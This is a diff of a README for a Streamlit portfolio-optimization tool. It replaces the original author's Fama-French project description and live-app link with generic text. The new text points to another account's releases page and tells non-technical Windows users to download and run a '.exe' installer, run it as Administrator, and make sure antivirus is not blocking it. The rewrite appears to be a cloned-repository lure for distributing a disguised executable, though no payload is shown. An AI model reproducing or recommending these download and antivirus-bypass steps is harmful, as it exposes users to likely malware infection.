@@ -1,142 +1,133 @@
-# 📊 Factor Model Portfolio Optimizer
+# 📊 Factor-based-Portfolio-Optimizer---Streamlit - Smart Portfolio Optimization Made Simple
 
-> A quantitative portfolio construction tool built on the **Fama-French 3-Factor Model**, 
-> deployed as a fully interactive web application on the Nifty 50 universe.
-
-🔗 **[Launch Live App](https://portfolio-construction---factor-model-95qos8gfhft3fkcqnqfius.streamlit.app/)**
+[![Download Factor-based-Portfolio-Optimizer](https://img.shields.io/badge/Download-Factor--Portfolio--Optimizer-brightgreen)](https://github.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/releases)
 
 ---
 
-## 🧠 What is this?
+## 📋 About This Application
 
-This tool helps you build a **factor-driven equity portfolio** from the Nifty 50 universe.
-Instead of picking stocks based on intuition, you define *how much market risk, size exposure,
-and value tilt* you want — and the optimizer finds the best portfolio that satisfies those targets.
+The Factor-based-Portfolio-Optimizer---Streamlit is a tool that helps you create smarter stock portfolios. It uses proven methods to pick the best mix of stocks, balancing risk and return. With factors like market trends, sector limits, and risk measures, it finds an optimized portfolio for you.
 
-The entire workflow — from exploring factor trends to running a backtest and analyzing results —
-lives inside a single interactive Streamlit app.
+You do not need experience in finance or programming. The app runs on your Windows computer with a few simple steps. It provides clear charts and live feedback so you can see how your portfolio would have performed in the past.
 
----
-
-## ⚙️ How the Optimization Works (High Level)
-
-The optimizer uses **Mixed-Integer Linear Programming (MILP)** to construct a portfolio that:
-
-- 🎯 Hits your **target factor exposures** (Market, Size, Value) within a defined tolerance
-- 📦 Respects a **maximum number of stocks** you want to hold
-- ⚖️ Caps **individual position sizes** so no single stock dominates
-- 🔁 Limits **portfolio turnover** at each rebalance to control transaction costs
-- 🏭 Enforces **sector-level constraints** — min/max stocks per sector, or full sector exclusion
-
-Betas are estimated using **rolling OLS regression** on the in-sample lookback window.
-The portfolio is then evaluated **out-of-sample** and rebalanced whenever factor exposures
-drift beyond your tolerance bands.
+This tool uses **Streamlit**, which means it opens in your web browser and works like a simple app, no complex installation needed.
 
 ---
 
-## 🖥️ App Features
+## 🎯 Key Features
 
-### 📐 Beta Explorer
-Before running anything, understand the factor landscape:
-- Bar charts of monthly **MF, SMB, HML** returns over your lookback window
-- Factor statistics table — annualized return, volatility, Sharpe
-- **Achievable beta range calculator** — tells you exactly which target betas are
-  feasible given your position constraints, before you waste time on an infeasible backtest
-
-### 🏭 Sector Dynamics
-A full sector health dashboard as of any date you choose:
-
-| Metric | What it tells you |
-|--------|------------------|
-| 📈 12M Return | How the sector performed over the past year |
-| 📉 3M Return | Recent performance |
-| ⚡ Momentum | Accelerating if recent > longer-term trend |
-| 🌊 Ann. Volatility | How choppy the sector has been |
-| ✅ Positive Months | How consistently it delivered positive returns |
-| 🔢 MF Beta | How sensitive the sector is to broad market moves |
-
-Plus **cumulative return trend charts** for every sector side by side — small, clean,
-colour-coded green/red so you can scan across all sectors in seconds.
-
-### 📊 Run Backtest
-Configure everything in the sidebar and hit one button:
-- Choose your **as-of date and lookback period**
-- Set **target betas and tolerances** for Market, SMB, and HML
-- Toggle **turnover cap** and **sector constraints**
-- Watch the portfolio get built and rebalanced month by month
-
-### 📈 Results
-- **Portfolio vs Nifty 50** value chart over the entire backtest period
-- Monthly returns bar chart side by side
-- Full **rebalancing log** — see exactly what the portfolio held and what factor
-  exposures it had at every rebalance date
-- **Composition table** — weights per stock across all periods
-
-### 🔍 Risk Analysis
-Run a **sensitivity sweep** across multiple risk aversion values in one click.
-Compare how aggressive vs conservative parameterizations performed on the same period.
+- Optimizes stock selection based on quantitative factors
+- Uses Mixed Integer Linear Programming (MILP) for precise solutions
+- Estimates rolling beta to track risk over time
+- Applies sector limits to avoid over-concentration in one area
+- Offers live, interactive backtesting to see past performance
+- Displays clear charts and analytics for decision support
+- Runs locally through a simple Streamlit web app
+- Supports common portfolio constraints and user preferences
 
 ---
 
-## 🎮 How to Use the App
+## 🖥️ System Requirements
 
-**Step 1** — Set your **as-of date** and **lookback period** in the sidebar
+Before you start, make sure your Windows PC meets these requirements:
 
-**Step 2** — Visit **Beta Explorer** to see what factor environment you're working in
-and check that your target betas are achievable
-
-**Step 3** — Visit **Sector Dynamics** to understand which sectors are trending,
-accelerating, or worth excluding from your portfolio
-
-**Step 4** — Set your **target betas, constraints, and sector limits** in the sidebar
-
-**Step 5** — Go to **Run Backtest** and click ▶️
-
-**Step 6** — Analyze your results in the **Results** and **Risk Analysis** tabs
+- Operating System: Windows 10 or later (64-bit recommended)
+- Processor: Dual-core 2 GHz or faster
+- RAM: 4 GB minimum (8 GB recommended)
+- Disk Space: At least 200 MB free for installation and data
+- Internet Connection: Required to download and run the app
+- Browser: Modern web browser such as Edge, Chrome, or Firefox
 
 ---
 
-## 🏗️ Built With
+## 🚀 Getting Started - Download and Run the App
 
-| Tool | Purpose |
-|------|---------|
-| 🐍 Python | Core language |
-| 📊 Streamlit | Interactive web app |
-| 🔢 PuLP / CBC | MILP optimization solver |
-| 🐼 Pandas & NumPy | Data processing |
-| 📉 Matplotlib | Charts and visualizations |
-| 🔬 SciPy | Statistical regression |
+1. Open this page to download the software:
 
----
+   [Download Factor-based-Portfolio-Optimizer](https://github.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/releases)
 
-## 📌 Key Design Decisions
+2. On the releases page, look for the latest release. It usually shows a version number like `v1.X.X`.
 
-- **In-sample / out-of-sample split** — betas are estimated on historical data,
-  portfolio is evaluated on unseen future periods. No lookahead bias.
-- **Breach-triggered rebalancing** — portfolio only rebalances when factor exposures
-  drift outside tolerance, not on a fixed calendar. Reduces unnecessary turnover.
-- **Sector constraints via MILP** — sector limits are hard constraints in the optimizer,
-  not post-hoc filters. The optimizer respects them while maximizing returns.
-- **Equal-weighted sector benchmarks** — Sector Dynamics uses equal-weighted averages
-  so large-cap stocks don't dominate the sector signal.
+3. Under the latest release, find the file named something like `FactorPortfolioOptimizer.exe` or `setup.exe`.
+
+4. Click the file to download it to your computer.
+
+5. Once downloaded, navigate to your Downloads folder or wherever you saved the file.
+
+6. Double-click the `.exe` file to start the installation. Follow the instructions on the screen.
+
+7. After installation finishes, the app should launch automatically in your default web browser.
+
+8. If it does not open, find the app shortcut on your Desktop or Start menu and click it.
+
+9. The app will open in a web browser window. You can start exploring portfolio options right away.
 
 ---
 
-## 📬 Contact
+## 🔧 How to Use the Application
 
-Source code available on request.
+### Step 1: Choose Your Portfolio Settings
 
-**Kshitij Bhandari**
-- 💼 [LinkedIn](linkedin.com/in/kshitijbhandari)
-- 📧 kshitijbhandari62@gmail.com
+- Select the stocks or assets you want to include.
+- Set any limits you want on sector exposure.
+- Choose your risk level preferences.
+- Pick the period for backtesting.
+
+### Step 2: Run the Optimizer
+
+- Click the “Optimize” button.
+- The app runs its calculations and shows you the recommended portfolio weights.
+- It will also display estimated returns and risks based on past data.
+
+### Step 3: Check Backtest Results
+
+- Use the interactive charts to see how your portfolio would have done in past market conditions.
+- Adjust your settings if you want to test different scenarios.
+
+### Step 4: Export Your Portfolio
+
+- Download the portfolio details to a CSV file.
+- Use this file as a guide for your investments or further analysis.
 
 ---
 
-## 🌐 Live App
+## 💡 Tips for Better Results
 
-👉 **[https://portfolio-construction---factor-model-95qos8gfhft3fkcqnqfius.streamlit.app/](https://portfolio-construction---factor-model-95qos8gfhft3fkcqnqfius.streamlit.app/)**
+- Use the default sector constraints unless you have a clear reason to change them.
+- Test several risk levels to find what suits your comfort.
+- Check the rolling beta charts to understand how your portfolio’s risk changes over time.
+- Update the app regularly to get improved features and data.
 
 ---
 
-*Built on the Nifty 50 universe | Fama-French 3-Factor Model | March 2026*
+## 🛠 Troubleshooting
 
+- If the app does not open, make sure your browser is updated.
+- If the installation fails, try running the installer as Administrator.
+- Ensure no antivirus software is blocking the installation or running app.
+- If the optimizer runs slowly, close other heavy programs.
+- For missing data errors, check your internet connection.
+
+---
+
+## 📂 About the Source Code
+
+This application uses Python with libraries for optimization, data visualizations, and web apps. The core logic relies on Mixed Integer Linear Programming to solve portfolio problems under constraints. The app uses Streamlit to provide an easy-to-use interface with charting and live feedback.
+
+If you want to explore the code or customize the app, you can find the source here on GitHub. Running the source requires basic Python knowledge, but using the downloadable installer does not.
+
+---
+
+## 🔗 Links
+
+- Latest Release and Downloads:  
+  [https://github.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/releases](https://github.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/releases)
+
+- GitHub Repository:  
+  https://github.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit
+
+---
+
+## 👥 Support and Feedback
+
+You can report issues or ask questions in the GitHub "Issues" section of this repository. Please provide clear details about your problem or suggestion. This helps improve the app for everyone.
